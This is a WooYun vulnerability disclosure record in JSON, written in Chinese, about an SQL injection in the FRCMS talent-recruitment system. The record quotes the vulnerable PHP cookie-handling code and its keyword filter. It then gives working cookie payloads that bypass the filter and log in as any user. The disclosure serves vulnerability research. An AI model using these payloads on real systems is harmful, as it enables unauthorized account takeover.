{"id": 51519, "wybug_id": "wooyun-2014-074219", "wybug_title": "嘉缘人才系统SQL注入导致任意用户登陆", "wybug_corp": "finereason.com", "wybug_author": "xfkxfk", "wybug_date": "2014-08-29 10:26", "wybug_open_date": "2014-11-24 10:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向公众公开  简要描述： 嘉缘人才系统SQL注入导致任意用户登陆 详细说明：  文件member/index.php\nrequire('check.php');if(empty($do)) $do= '';$titstr=\"会员中心\";     $user_type=_getcookie('user_type');$ut='';$user_type=='pmember'&&$ut='person';$user_type=='cmember'&&$ut='company';$user_type=='smember'&&$ut='school';$user_type=='tmember'&&$ut='train';\n这里包含了check.php，跟进文件member/check.php\n<?php/*\t[FRCMS] Copyright (c) 2010 Finereason.COM\tThis is NOT a freeware, use is subject to license.txt*/defined('IN_FR') or exit('Access Denied');!isset($db)&&$db=connectdb();$goto=urlencode($_SERVER['REQUEST_URI']);$username=_getcookie('user_login');if($username==''){    $str='';    foreach($_POST as $key => $val){\t\t$str.=\"&$key=$val\";\t}\t$goto=urlencode(joinchar($_SERVER['REQUEST_URI']).substr($str,1));    echo \"<script language=JavaScript>{location.href='{$cfg['path']}login.php?goto=$goto';}</script>\";    exit();}else{    $userpass=_getcookie('user_pass');    $rs = $db->get_one(\"select m_id,m_flag,DATEDIFF(m_enddate,'\".date('Y-m-d').\"') as end,m_typeid,m_groupid,m_balance,m_integral,m_resumenums,m_mysendnums,m_mysendnum,m_myinterviewnums,m_myinterviewnum,m_myfavoritenums,m_myfavoritenum,m_letternums,m_contactnums,m_contactnum,m_expertnums,m_expertnum,m_recyclenums,m_recyclenum,m_hirenums,m_hirenum,m_hirenums,m_hirenum,m_smsnums,m_smsnum,m_operator,m_openid,m_mobileauth,m_emailauth,m_logo,m_confirm,m_logostatus from {$cfg['tb_pre']}member where m_login='$username' and m_pwd='$userpass' limit 0,1\");\n这里注意：$username=_getcookie('user_login');$userpass=_getcookie('user_pass');$username和$userpass进入了SQL语句，继续跟进_getcookie文件/inc/common.inc.php\nfunction _getcookie($var) {\tglobal $cfg;\t$var = $cfg['cookie_pre'].$var;\treturn isset($_COOKIE[$var]) ? $_COOKIE[$var] : '';}\n这里的$cfg['cookie_pre']='fr_'直接从_COOKIE获取参数值带入了上面的SQL语句，没有任何过滤，导致SQL注入这里在进入SQL之前有一个防注入：\nfunction checksql($dbstr,$querytype='select'){\t$clean = '';\t$old_pos = 0;\t$pos = -1;\t//普通语句，直接过滤特殊语法\tif($querytype=='select'){\t\t$nastr = \"/[^0-9a-z@\\._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\\.-]{1,}/i\";\t\tif(preg_match($nastr,$dbstr)){            log_write($dbstr,'sql');            showmsg('SafeError:10001', 'javascript:;');            exit();\t\t}\t}\t//完整的SQL检查\twhile (true){\t\t$pos = strpos($dbstr, '\\'', $pos + 1);\t\tif ($pos === false){\t\t\tbreak;\t\t}\t\t$clean .= substr($dbstr, $old_pos, $pos - $old_pos);\t\twhile (true){\t\t\t$pos1 = strpos($dbstr, '\\'', $pos + 1);\t\t\t$pos2 = strpos($dbstr, '\\\\', $pos + 1);\t\t\tif ($pos1 === false){\t\t\t\tbreak;\t\t\t}\t\t\telseif ($pos2 == false || $pos2 > $pos1){\t\t\t\t$pos = $pos1;\t\t\t\tbreak;\t\t\t}\t\t\t$pos = $pos2 + 1;\t\t}\t\t$clean .= '$s$';\t\t$old_pos = $pos + 1;\t}\t$clean .= substr($dbstr, $old_pos);\t$clean = trim(strtolower(preg_replace(array('~\\s+~s' ), array(' '), $clean)));\tif (strpos($clean, 'union') !== false && preg_match('~(^|[^a-z])union($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, '/*') > 2 || strpos($clean, '--') !== false || strpos($clean, '#') !== false){\t\t$fail = true;\t}\telseif (strpos($clean, 'sleep') !== false && preg_match('~(^|[^a-z])sleep($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, 'benchmark') !== false && preg_match('~(^|[^a-z])benchmark($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, 'load_file') !== false && preg_match('~(^|[^a-z])load_file($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (strpos($clean, 'into outfile') !== false && preg_match('~(^|[^a-z])into\\s+outfile($|[^[a-z])~s', $clean) != 0){\t\t$fail = true;\t}\telseif (preg_match('~\\([^)]*?select~s', $clean) != 0){\t\t$fail = true;\t}\tif (!empty($fail)){        log_write($dbstr,'sql');        showmsg('SafeError:10002', 'javascript:;');exit;\t}\telse\t{\t\treturn $dbstr;\t}}?>\n但是可以轻易绕过了   漏洞证明：  访问：http://10.65.20.198/frcms/member/index.php然后抓包，将cookie中的fr_user_pass或者fr_user_login的值加入单引号'发送请求，会导致sql报错：\n\n那么这里我们可以任意用户登录了。发送cookie：fr_user_login=111111' and char(@`'`) or 1=2#会跳转到登陆页面发送cookie：fr_user_login=111111' and char(@`'`) or 1=1#即可登陆用户\n\n这里cookei中的 fr_user_type表示用户类型，修改这里的 fr_user_type的值即可登陆不同用户了。   修复方案：  过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-24 10:28 厂商回复：  最新状态： 2014-09-13：最近没有登录乌云，未及时处理，系统自动胡乱，在这里感谢提交此漏洞，官方紧急修复处理中。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}